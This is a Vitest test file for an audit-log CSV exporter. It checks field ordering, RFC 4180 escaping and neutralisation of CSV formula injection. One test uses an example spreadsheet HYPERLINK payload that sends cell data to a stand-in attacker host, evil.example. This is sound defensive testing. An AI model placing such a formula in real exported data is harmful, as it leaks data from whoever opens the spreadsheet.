// @vitest-environment node
import { describe, it, expect } from 'vitest';
import { auditEntriesToCsv } from './audit-csv';
import type { AuditEntry } from '@/lib/api/types';

const HEADER = 'Timestamp,Actor,Action,Resource Type,Resource ID,Severity,Correlation ID';

// J-14 CSV export — the audit log must export to a valid CSV file (DoD:
// "export CSV → arquivo válido"). Columns carry RAW fields (machine-faithful,
// pivotable in a spreadsheet), not the humanized display strings the table
// renders. RFC 4180 escaping.
describe('auditEntriesToCsv', () => {
  it('emits only the header row for an empty list', () => {
    expect(auditEntriesToCsv([])).toBe(HEADER);
  });

  it('maps canonical fields into columns, in order, CRLF-separated', () => {
    const e: AuditEntry = {
      action: 'deploy.created',
      resource_type: 'builds',
      resource_id: 'b-123',
      actor: 'paulo@x.com',
      timestamp: '2026-07-03T10:00:00Z',
      severity: 'info' as AuditEntry['severity'],
      correlation_id: 'corr-9',
    };
    const csv = auditEntriesToCsv([e]);
    const [header, row] = csv.split('\r\n');
    expect(header).toBe(HEADER);
    expect(row).toBe(
      '2026-07-03T10:00:00Z,paulo@x.com,deploy.created,builds,b-123,info,corr-9',
    );
  });

  it('quotes and escapes fields with comma, quote, or newline (RFC 4180)', () => {
    const e = {
      action: 'note,with"quote',
      actor: 'line\nbreak',
      timestamp: '2026-07-03T10:00:00Z',
    } as AuditEntry;
    const row = auditEntriesToCsv([e]).split('\r\n')[1];
    expect(row).toContain('"line\nbreak"'); // newline field wrapped in quotes
    expect(row).toContain('"note,with""quote"'); // comma+quote wrapped, quote doubled
  });

  // CWE-1236 (loop-console#157): audit fields are user-authored (project names,
  // emails, resource ids) and the export is opened by a privileged owner. A
  // value starting with =/+/-/@/tab/CR is a live formula in Excel/Sheets —
  // neutralize it with a leading apostrophe BEFORE RFC-4180 quoting.
  it('neutralizes leading formula chars to prevent CSV injection', () => {
    const cases: Array<[string, string]> = [
      ['=1+1', "'=1+1"],
      ['+2', "'+2"],
      ['-3', "'-3"],
      ['@cmd', "'@cmd"],
      ['\tx', "'\tx"],
    ];
    for (const [raw, want] of cases) {
      const e = { action: raw, timestamp: '2026-07-03T10:00:00Z' } as AuditEntry;
      const cell = auditEntriesToCsv([e]).split('\r\n')[1].split(',')[2];
      expect(cell).toBe(want);
    }
  });

  it('neutralizes a realistic HYPERLINK exfil payload', () => {
    const e = {
      action: '=HYPERLINK("http://evil.example/?d="&A1,"click")',
      timestamp: '2026-07-03T10:00:00Z',
    } as AuditEntry;
    const row = auditEntriesToCsv([e]).split('\r\n')[1];
    // apostrophe-guarded (inert) and RFC-quoted for the embedded comma+quotes;
    // the cell is never a bare leading '='.
    expect(row).toContain(`"'=HYPERLINK`);
    expect(row).not.toContain(',=HYPERLINK');
  });

  it('leaves benign values unchanged (no spurious apostrophe)', () => {
    const e = { action: 'deploy.created', actor: 'paulo@x.com', timestamp: 't' } as AuditEntry;
    const row = auditEntriesToCsv([e]).split('\r\n')[1];
    expect(row).toBe('t,paulo@x.com,deploy.created,,,,');
  });

  it('falls back to legacy ts / actor_email when canonical fields absent', () => {
    const e = {
      action: 'x',
      ts: '2026-01-01T00:00:00Z',
      actor_email: 'legacy@x.com',
    } as unknown as AuditEntry;
    const row = auditEntriesToCsv([e]).split('\r\n')[1];
    expect(row.startsWith('2026-01-01T00:00:00Z,legacy@x.com,x,')).toBe(true);
  });
});
